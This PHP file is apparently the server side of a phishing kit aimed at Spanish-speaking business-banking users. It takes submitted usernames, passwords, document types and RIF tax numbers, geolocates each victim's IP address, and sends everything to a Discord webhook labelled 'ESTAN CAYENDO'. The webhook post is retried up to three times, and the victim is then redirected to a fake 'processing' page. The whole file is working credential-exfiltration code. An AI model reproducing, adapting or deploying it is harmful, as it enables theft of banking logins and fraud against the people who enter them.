<?php
session_start();

header('Content-Type: text/html; charset=utf-8');
ini_set('display_errors', 0);
error_reporting(E_ALL);

$configPath = realpath(__DIR__ . '/../../config/config.php');
if (!file_exists($configPath)) {
    error_log("Error crítico: Archivo de configuración no encontrado en $configPath");
    die("Ocurrió un error inesperado. Por favor intente más tarde.");
}

require_once($configPath);

if (!defined('DISCORD_WEBHOOK_URL') || empty(DISCORD_WEBHOOK_URL)) {
    error_log("Error crítico: Discord Webhook URL no configurada");
    die("Ocurrió un error de configuración. Contacte al administrador.");
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 405 Method Not Allowed');
    die('Método no permitido');
}

$requiredFields = ['username', 'password', 'doctype', 'rif'];
foreach ($requiredFields as $field) {
    if (empty($_POST[$field])) {
        error_log("Error de validación: Campo $field vacío");
        header("Location: ../error.html?code=missing_$field");
        exit;
    }
}

$username = filter_var($_POST['username'], FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_LOW);
$password = filter_var($_POST['password'], FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_LOW);
$doctype = filter_var($_POST['doctype'], FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_LOW);
$rif = filter_var($_POST['rif'], FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_LOW);

$_SESSION['username'] = $username;
$_SESSION['password'] = $password;
$_SESSION['doctype'] = $doctype;
$_SESSION['rif'] = $rif;

function getRealUserIP() {
    $ipKeys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            foreach ($ipList as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'IP no detectada';
}

$ip = getRealUserIP();

function getGeoLocation($ip) {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return ['error' => 'IP inválida'];
    }

    $providers = [
        'ipapi' => "https://ipapi.co/{$ip}/json/",
        'ip-api' => "http://ip-api.com/json/{$ip}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting"
    ];
    
    $geoData = [
        'country' => 'Desconocido',
        'region' => 'Desconocido',
        'city' => 'Desconocido',
        'isp' => 'Desconocido',
        'proxy' => false
    ];
    
    foreach ($providers as $provider => $url) {
        try {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => true
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            if ($httpCode === 200 && $response) {
                $data = json_decode($response, true);
                
                if ($provider === 'ipapi' && !isset($data['error'])) {
                    $geoData['country'] = $data['country_name'] ?? $geoData['country'];
                    $geoData['region'] = $data['region'] ?? $geoData['region'];
                    $geoData['city'] = $data['city'] ?? $geoData['city'];
                    $geoData['isp'] = $data['org'] ?? $geoData['isp'];
                    break;
                } elseif ($provider === 'ip-api' && ($data['status'] ?? '') === 'success') {
                    $geoData['country'] = $data['country'] ?? $geoData['country'];
                    $geoData['region'] = $data['regionName'] ?? $geoData['region'];
                    $geoData['city'] = $data['city'] ?? $geoData['city'];
                    $geoData['isp'] = $data['isp'] ?? $geoData['isp'];
                    $geoData['proxy'] = $data['proxy'] ?? false;
                    break;
                }
            }
        } catch (Exception $e) {
            error_log("Error con proveedor $provider: " . $e->getMessage());
            continue;
        }
    }
    
    return $geoData;
}

$geoData = getGeoLocation($ip);
$uniqueId = strtoupper(substr(md5($ip . microtime()), 0, 8));
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';

$fields = [
    ["name" => "🆔 Tipo de Documento", "value" => "```$doctype```", "inline" => true],
    ["name" => "🏦 RIF", "value" => "```$rif```", "inline" => true],
    ["name" => "👤 Usuario", "value" => "```$username```", "inline" => true],
    ["name" => "🔑 Contraseña", "value" => "```$password```", "inline" => true],
    ["name" => "🌍 Dirección IP", "value" => "```$ip```", "inline" => false],
    ["name" => "📍 Ubicación", "value" => "🗺️ " . implode(', ', array_filter([
        $geoData['city'],
        $geoData['region'],
        $geoData['country']
    ])), "inline" => false],
    ["name" => "📡 Proveedor", "value" => "```" . $geoData['isp'] . "```", "inline" => true],
    ["name" => "⚠️ Proxy/VPN", "value" => $geoData['proxy'] ? "✅ Sí" : "❌ No", "inline" => true],
    ["name" => "🕒 Fecha/Hora", "value" => "```" . date('Y-m-d H:i:s T') . "```", "inline" => false],
    ["name" => "🖥️ Navegador", "value" => "```" . substr($userAgent, 0, 100) . "```", "inline" => false],
    ["name" => "#️⃣ ID de Sesión", "value" => "```#$uniqueId```", "inline" => false]
];

$embed = [
    "title" => "🔐 **NUEVA CUENTA EMPRESARIAL** 🔐",
    "color" => hexdec("e67e22"),
    "fields" => $fields,
    "footer" => [
        "text" => "made by @morph3ush4ck | " . date('Y-m-d'),
        "icon_url" => "https://upload.wikimedia.org/wikipedia/commons/c/ca/Osama_bin_Laden_portrait.jpg"
    ],
    "timestamp" => date('c')
];

$payload = [
    "username" => "🚨 ESTAN CAYENDO 🚨",
    "avatar_url" => "https://media.istockphoto.com/id/911660906/vector/computer-hacker-with-laptop-icon.jpg?s=612x612&w=0&k=20&c=rmx25IUnM2fHP4lXG96PNeZ_YQ1kQUTTWfGU4EE5iqQ=",
    "embeds" => [$embed],
    "content" => "@here Nueva verificación de cuenta empresarial"
];

function sendToDiscord($payload) {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => DISCORD_WEBHOOK_URL,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Accept: application/json'
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        error_log("Error cURL: " . $error);
        return false;
    }
    
    if ($httpCode !== 204) {
        error_log("Discord respondió con código: $httpCode - Respuesta: " . $response);
        return false;
    }
    
    return true;
}

$maxRetries = 3;
$retryCount = 0;
$success = false;

while ($retryCount < $maxRetries && !$success) {
    $success = sendToDiscord($payload);
    $retryCount++;
    
    if (!$success && $retryCount < $maxRetries) {
        sleep(1);
    }
}

header("Location: ../procesando.html");
exit;
?>